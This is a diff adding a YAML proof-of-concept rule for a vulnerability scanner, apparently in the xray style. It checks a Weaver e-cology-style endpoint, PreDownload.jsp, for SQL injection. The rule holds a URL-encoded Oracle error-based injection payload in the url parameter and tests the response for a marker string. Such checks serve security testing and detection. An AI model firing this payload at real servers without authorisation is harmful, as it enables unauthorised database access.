@@ -1,0 +1,13 @@
+name: poc-yaml-ecology-PreDownload-sqli
+rules:
+  - method: GET
+    path: >-
+      /mobile/plugin/PreDownload.jsp?url=1%27%20AND%207528%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287528%3D7528%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%271%27%3D%271
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(b"qzpxq1qbpxq")
+detail:
+  author: TimWhite
+  links:
+    - https://www.uedbox.com/post/17980/
+    - https://github.com/zhangzhenfeng/AnyScan/blob/master/AnyScanUI/AnyPoc/data/poc/bugscan/exp%EF%BC%8D1775.py
